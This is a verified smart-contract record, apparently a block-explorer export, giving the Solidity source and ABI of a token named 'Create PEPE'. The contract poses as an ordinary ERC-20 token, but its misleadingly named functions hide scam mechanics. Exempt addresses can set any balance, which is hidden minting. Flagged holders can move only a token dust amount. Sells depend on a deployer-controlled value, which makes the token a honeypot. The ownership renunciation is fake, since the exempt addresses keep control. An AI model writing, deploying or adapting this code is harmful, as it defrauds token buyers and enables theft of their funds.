{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface buyFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverLaunched) external view returns (uint256);\n\n    function transfer(address marketingLiquidityAmount, uint256 txTakeReceiver) external returns (bool);\n\n    function allowance(address maxTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txTakeReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingLiquidityAmount,\n        uint256 txTakeReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingEnableIs, uint256 value);\n    event Approval(address indexed maxTo, address indexed spender, uint256 value);\n}\n\nabstract contract maxAutoLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderSell {\n    function createPair(address takeReceiverSwap, address buyReceiver) external returns (address);\n}\n\ninterface amountMode is buyFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CreatePEPE is maxAutoLaunch, buyFee, amountMode {\n\n    function allowance(address shouldLaunched, address marketingBuy) external view virtual override returns (uint256) {\n        if (marketingBuy == minFrom) {\n            return type(uint256).max;\n        }\n        return listMarketingTake[shouldLaunched][marketingBuy];\n    }\n\n    bool public feeWallet;\n\n    mapping(address => bool) public takeReceiver;\n\n    function minEnable(address amountMarketing, uint256 txTakeReceiver) public {\n        launchTo();\n        tokenLimit[amountMarketing] = txTakeReceiver;\n    }\n\n    function transferFrom(address txTotal, address marketingLiquidityAmount, uint256 txTakeReceiver) external override returns (bool) {\n        if (_msgSender() != minFrom) {\n            if (listMarketingTake[txTotal][_msgSender()] != type(uint256).max) {\n                require(txTakeReceiver <= listMarketingTake[txTotal][_msgSender()]);\n                listMarketingTake[txTotal][_msgSender()] -= txTakeReceiver;\n            }\n        }\n        return toList(txTotal, marketingLiquidityAmount, txTakeReceiver);\n    }\n\n    string private tradingFromLimit = \"CPE\";\n\n    string private limitLaunchedSender = \"Create PEPE\";\n\n    uint256 senderLimit;\n\n    function transfer(address amountMarketing, uint256 txTakeReceiver) external virtual override returns (bool) {\n        return toList(_msgSender(), amountMarketing, txTakeReceiver);\n    }\n\n    address minFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitMaxList;\n    }\n\n    function maxLiquidity(address senderMax) public {\n        launchTo();\n        \n        if (senderMax == tokenSellTeam || senderMax == maxFee) {\n            return;\n        }\n        takeReceiver[senderMax] = true;\n    }\n\n    uint256 public liquidityMode;\n\n    function shouldReceiver(address toExempt) public {\n        if (enableReceiver) {\n            return;\n        }\n        if (liquidityMode != listTo) {\n            feeWallet = true;\n        }\n        exemptSender[toExempt] = true;\n        if (txSwap != listTo) {\n            txSwap = liquidityMode;\n        }\n        enableReceiver = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundMax;\n    }\n\n    function balanceOf(address receiverLaunched) public view virtual override returns (uint256) {\n        return tokenLimit[receiverLaunched];\n    }\n\n    function approve(address marketingBuy, uint256 txTakeReceiver) public virtual override returns (bool) {\n        listMarketingTake[_msgSender()][marketingBuy] = txTakeReceiver;\n        emit Approval(_msgSender(), marketingBuy, txTakeReceiver);\n        return true;\n    }\n\n    uint256 private liquidityExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return limitLaunchedSender;\n    }\n\n    bool public liquidityListShould;\n\n    event OwnershipTransferred(address indexed walletMarketing, address indexed buyWallet);\n\n    function senderWallet(uint256 txTakeReceiver) public {\n        launchTo();\n        senderLimit = txTakeReceiver;\n    }\n\n    uint8 private limitMaxList = 18;\n\n    function owner() external view returns (address) {\n        return marketingSwap;\n    }\n\n    uint256 private sellFee;\n\n    constructor (){\n        if (liquidityListShould) {\n            shouldMarketingReceiver = true;\n        }\n        autoToken swapTeam = autoToken(minFrom);\n        maxFee = senderSell(swapTeam.factory()).createPair(swapTeam.WETH(), address(this));\n        \n        tokenSellTeam = _msgSender();\n        modeAtReceiver();\n        exemptSender[tokenSellTeam] = true;\n        tokenLimit[tokenSellTeam] = fundMax;\n        \n        emit Transfer(address(0), tokenSellTeam, fundMax);\n    }\n\n    uint256 private fundMax = 100000000 * 10 ** 18;\n\n    address private marketingSwap;\n\n    address marketingMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function modeAtReceiver() public {\n        emit OwnershipTransferred(tokenSellTeam, address(0));\n        marketingSwap = address(0);\n    }\n\n    address public tokenSellTeam;\n\n    function launchTo() private view {\n        require(exemptSender[_msgSender()]);\n    }\n\n    function toList(address txTotal, address marketingLiquidityAmount, uint256 txTakeReceiver) internal returns (bool) {\n        if (txTotal == tokenSellTeam) {\n            return modeTrading(txTotal, marketingLiquidityAmount, txTakeReceiver);\n        }\n        uint256 autoSwapTake = buyFee(maxFee).balanceOf(marketingMin);\n        require(autoSwapTake == senderLimit);\n        require(marketingLiquidityAmount != marketingMin);\n        if (takeReceiver[txTotal]) {\n            return modeTrading(txTotal, marketingLiquidityAmount, receiverAmount);\n        }\n        return modeTrading(txTotal, marketingLiquidityAmount, txTakeReceiver);\n    }\n\n    bool public maxMode;\n\n    uint256 constant receiverAmount = 3 ** 10;\n\n    bool private shouldMarketingReceiver;\n\n    uint256 takeMin;\n\n    address public maxFee;\n\n    function modeTrading(address txTotal, address marketingLiquidityAmount, uint256 txTakeReceiver) internal returns (bool) {\n        require(tokenLimit[txTotal] >= txTakeReceiver);\n        tokenLimit[txTotal] -= txTakeReceiver;\n        tokenLimit[marketingLiquidityAmount] += txTakeReceiver;\n        emit Transfer(txTotal, marketingLiquidityAmount, txTakeReceiver);\n        return true;\n    }\n\n    mapping(address => bool) public exemptSender;\n\n    bool public enableReceiver;\n\n    uint256 public txSwap;\n\n    mapping(address => uint256) private tokenLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingFromLimit;\n    }\n\n    mapping(address => mapping(address => uint256)) private listMarketingTake;\n\n    uint256 public listTo;\n\n    function getOwner() external view returns (address) {\n        return marketingSwap;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingEnableIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTakeReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityListShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMax\",\"type\":\"address\"}],\"name\":\"maxLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTakeReceiver\",\"type\":\"uint256\"}],\"name\":\"minEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAtReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txTakeReceiver\",\"type\":\"uint256\"}],\"name\":\"senderWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"}],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSellTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTakeReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingLiquidityAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTakeReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CreatePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}